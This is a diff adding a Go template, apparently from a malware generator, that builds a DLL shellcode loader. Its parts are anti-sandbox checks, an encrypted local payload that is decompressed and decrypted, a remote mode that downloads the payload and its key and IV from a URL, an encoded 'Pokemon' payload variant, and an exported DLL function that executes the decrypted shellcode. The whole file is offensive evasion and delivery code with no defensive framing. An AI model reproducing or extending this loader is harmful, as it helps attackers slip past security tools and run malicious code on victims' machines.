@@ -1,0 +1,136 @@
+package main
+
+import (
+    "C"
+    "variant/crypto"
+
+    {{if .Loader}}
+        "{{.Loader.Import}}"
+    {{- end -}}
+
+    {{if .Compressor}}
+        "{{.Compressor.Import}}"
+    {{- end -}}
+
+    {{if .Dynamic}}
+        "{{.Dynamic.Import}}"
+    {{- end -}}
+
+    {{if .SandBox}}
+        "{{.SandBox.Import}}"
+    {{- end -}}
+
+    {{if .Args}}
+        "{{.Args.Import}}"
+    {{- end}}
+)
+
+func init() {
+    {{/* Anti SandBox */}}
+    {{if .SandBox}}
+        {{range .SandBox.Methods}}
+            {{.}}()
+	    {{- end -}}
+	{{- end}}
+}
+
+{{if .Local}}
+func {{.Local.MainLocal}}() {
+    {{/* Key & IV */}}
+    {{if .Local.KeyName}}
+        {{.Local.KeyName}} := []byte("{{.Local.KeyValue}}")
+    {{end}}
+
+    {{if .Local.IvName}}
+        {{.Local.IvName}} := []byte("{{.Local.IvValue}}")
+    {{end}}
+
+    {{/* 本地加载 */}}
+    {{.CipherText}} := "{{.Local.Payload}}"
+
+    {{/* 解压 shellcode */}}
+    {{if .Compressor}}
+        {{.CipherText}}, _ = {{.Compressor.Algorithm}}([]byte({{.CipherText}}), {{.Compressor.Ratio}})
+    {{end}}
+
+    {{/* 解密 shellcode */}}
+    {{.PlainText}}, _ := {{.Local.DecryptLocal}}(
+        {{.CipherText}},
+        {{if .Local.KeyName}} {{.Local.KeyName}}, {{end}}
+        {{if .Local.IvName}} {{.Local.IvName}} {{end}})
+
+    {{/* 执行 shellcode */}}
+    {{.Loader.Method}}({{.PlainText}})
+}
+{{end}}
+
+{{if .Dynamic}}
+func {{.Dynamic.MainDynamic}}() {
+    {{/* Dynamic Key & IV */}}
+    {{if .Dynamic.DynamicKey}}
+        {{.Dynamic.DynamicKey}} := {{.Dynamic.DynamicMethod}}(
+        "{{.Dynamic.DynamicUrl}}",
+        {{.Dynamic.KeyStart}},
+        {{.Dynamic.KeyEnd}})
+    {{end}}
+
+    {{if .Dynamic.DynamicIV}}
+        {{.Dynamic.DynamicIV}} := {{.Dynamic.DynamicMethod}}(
+        "{{.Dynamic.DynamicUrl}}",
+        {{.Dynamic.IVStart}},
+        {{.Dynamic.IVEnd}})
+    {{end}}
+
+    {{/* Dynamic Load */}}
+    {{if .Remote}}
+        {{if .Remote.Method}}
+            {{.CipherText}} := {{.Remote.Method}}("{{.Remote.Url}}")
+        {{else if .Remote.UCFileCode}}
+            {{.CipherText}} := {{.Remote.UCMethod}}("{{.Remote.UCFileCode}}")
+        {{end}}
+    {{end}}
+
+    {{/* 远程加载 动态解密 */}}
+    {{.PlainText}}, _ := {{.Dynamic.DecryptDynamic}}(
+        {{.CipherText}},
+        {{.Dynamic.DynamicKey}} {{if .Dynamic.DynamicIV}},
+        {{.Dynamic.DynamicIV}} {{end}})
+
+    {{/* 执行 shellcode */}}
+    {{.Loader.Method}}({{.PlainText}})
+}
+{{end}}
+
+{{if .Pokemon}}
+func {{.Pokemon.MainPokemon}}(){
+    {{/* Pokemon 本地加载 */}}
+    {{.CipherText}} := []string{
+        {{range .Pokemon.PokemonPayload}}"{{.}}",
+        {{end}}
+    }
+    {{.PlainText}} := {{.Pokemon.DecryptPokemon}}({{.CipherText}})
+
+    {{/* 执行 shellcode */}}
+    {{.Loader.Method}}({{.PlainText}})
+}
+{{end}}
+
+//export {{.DLLibrary.DllFuncName}}
+func {{.DLLibrary.DllFuncName}}() {
+    {{/* 本地加载 */}}
+    {{if .Local}}
+        {{.Local.MainLocal}}()
+    {{end}}
+
+    {{/* Pokemon 本地加载 */}}
+    {{if .Pokemon}}
+        {{.Pokemon.MainPokemon}}()
+    {{end}}
+
+    {{/* 远程加载 */}}
+    {{if .Dynamic}}
+        {{.Dynamic.MainDynamic}}()
+    {{end}}
+}
+
+func main(){}
